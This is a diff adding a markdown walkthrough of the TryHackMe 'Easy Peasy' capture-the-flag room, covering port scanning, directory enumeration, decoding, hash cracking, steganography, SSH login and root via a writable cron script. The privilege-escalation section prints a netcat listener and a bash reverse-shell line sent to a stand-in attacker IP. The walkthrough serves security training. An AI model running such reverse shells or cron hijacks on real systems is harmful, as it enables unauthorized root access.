@@ -1,0 +1,337 @@
+# Easy Peasy - TryHackMe
+
+## Overview
+
+Easy Peasy is a beginner-friendly Linux machine that covers multiple penetration testing concepts, including web enumeration, source code analysis, encoding and decoding techniques, hash cracking, steganography, SSH access, and Linux privilege escalation through a vulnerable cron job.
+
+---
+
+# Reconnaissance
+
+## Full Port Scan
+
+```bash
+nmap -p- <TARGET_IP>
+```
+
+### Result
+
+```
+80/tcp     HTTP (Nginx)
+6498/tcp   SSH
+65524/tcp  HTTP (Apache)
+```
+
+---
+
+## Service Enumeration
+
+```bash
+nmap -sC -sV -p 80,6498,65524 <TARGET_IP>
+```
+
+This confirms:
+
+- Nginx web server on port 80
+- OpenSSH on port 6498
+- Apache web server on port 65524
+
+---
+
+# Port 80 Enumeration
+
+Directory enumeration was performed using Gobuster.
+
+```bash
+gobuster dir -u http://<TARGET_IP>/ \
+-w /usr/share/wordlists/dirb/common.txt
+```
+
+Discovered directory:
+
+```
+/hidden
+```
+
+Continue enumeration.
+
+```bash
+gobuster dir -u http://<TARGET_IP>/hidden/ \
+-w /usr/share/wordlists/dirb/common.txt
+```
+
+Discovered:
+
+```
+/whatever
+```
+
+Viewing the page source revealed a Base64 encoded string.
+
+Decode it using:
+
+```bash
+echo "<BASE64_STRING>" | base64 -d
+```
+
+Successfully recovered **Flag 1**.
+
+---
+
+# Port 65524 Enumeration
+
+Visit:
+
+```
+http://<TARGET_IP>:65524
+```
+
+Viewing the page source reveals another encoded string.
+
+```
+ObsJmP173N2X6dOrAgEAL0Vu
+```
+
+The string was decoded using **CyberChef (Base62)**.
+
+Recovered hidden directory:
+
+```
+/n0th1ng3ls3m4tt3r/
+```
+
+---
+
+# Hidden Directory Analysis
+
+Visit:
+
+```
+http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/
+```
+
+The page contains:
+
+- An image
+- A GOST hash
+
+Download the image.
+
+```bash
+wget http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+```
+
+---
+
+# Hash Cracking
+
+Save the hash.
+
+```bash
+echo "<GOST_HASH>" > hash.txt
+```
+
+Crack the hash using John the Ripper.
+
+```bash
+john --wordlist=easypeasy.txt \
+--format=gost hash.txt
+```
+
+Display the recovered password.
+
+```bash
+john --show hash.txt
+```
+
+Recovered passphrase:
+
+```
+mypasswordforthatjob
+```
+
+---
+
+# Steganography
+
+Extract the hidden content from the image.
+
+```bash
+steghide extract -sf binarycodepixabay.jpg
+```
+
+Enter the recovered passphrase:
+
+```
+mypasswordforthatjob
+```
+
+A file named:
+
+```
+secrettext.txt
+```
+
+is extracted.
+
+Contents:
+
+```
+username: boring
+password: <binary>
+```
+
+The password is stored as binary and must be converted into plain text.
+
+Recovered credentials:
+
+```
+Username: boring
+Password: iconvertedmypasswordtobinary
+```
+
+---
+
+# SSH Access
+
+Connect using SSH.
+
+```bash
+ssh boring@<TARGET_IP> -p 6498
+```
+
+---
+
+# User Enumeration
+
+List files.
+
+```bash
+ls -la
+```
+
+Read the user flag.
+
+```bash
+cat user.txt
+```
+
+The flag is encoded using **ROT13**.
+
+Decode using:
+
+```bash
+echo "<ROT13_TEXT>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+Recovered the User Flag.
+
+---
+
+# Privilege Escalation
+
+Inspect scheduled tasks.
+
+```bash
+cat /etc/crontab
+```
+
+Interesting cron job:
+
+```text
+* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
+```
+
+Inspect the script.
+
+```bash
+cat /var/www/.mysecretcronjob.sh
+```
+
+Check permissions.
+
+```bash
+ls -l /var/www/.mysecretcronjob.sh
+```
+
+The script is writable by the current user while being executed as **root** every minute.
+
+Start a listener.
+
+```bash
+nc -lvnp 4444
+```
+
+Append a reverse shell.
+
+```bash
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /var/www/.mysecretcronjob.sh
+```
+
+Wait for the cron job to execute.
+
+Once the reverse shell connects:
+
+```bash
+id
+```
+
+Output:
+
+```
+uid=0(root)
+```
+
+Navigate to the root directory.
+
+```bash
+cd /root
+ls -la
+cat .root.txt
+```
+
+Successfully recovered the Root Flag.
+
+---
+
+# Skills Practiced
+
+- Nmap Enumeration
+- Service Detection
+- Gobuster Directory Enumeration
+- robots.txt Analysis
+- HTML Source Code Review
+- Base64 Decoding
+- Base62 Decoding
+- MD5 Identification
+- GOST Hash Cracking
+- John the Ripper
+- Steganography
+- Binary Decoding
+- SSH Authentication
+- ROT13 Decoding
+- Linux Enumeration
+- Cron Job Privilege Escalation
+
+---
+
+# Key Takeaways
+
+- Always perform a full TCP port scan.
+- Enumerate every exposed web service independently.
+- Never ignore page source or robots.txt.
+- Identify encoding before decoding.
+- Identify hash type before attempting to crack it.
+- Images may contain hidden information.
+- Enumerate cron jobs after obtaining shell access.
+- Writable scripts executed by root can lead to full system compromise.
+
+---
+
+**Room:** Easy Peasy
+
+**Platform:** TryHackMe
+
+**Difficulty:** Easy
+
+**Techniques:** Enumeration, Web Exploitation, Hash Cracking, Steganography, SSH, Linux Privilege Escalation
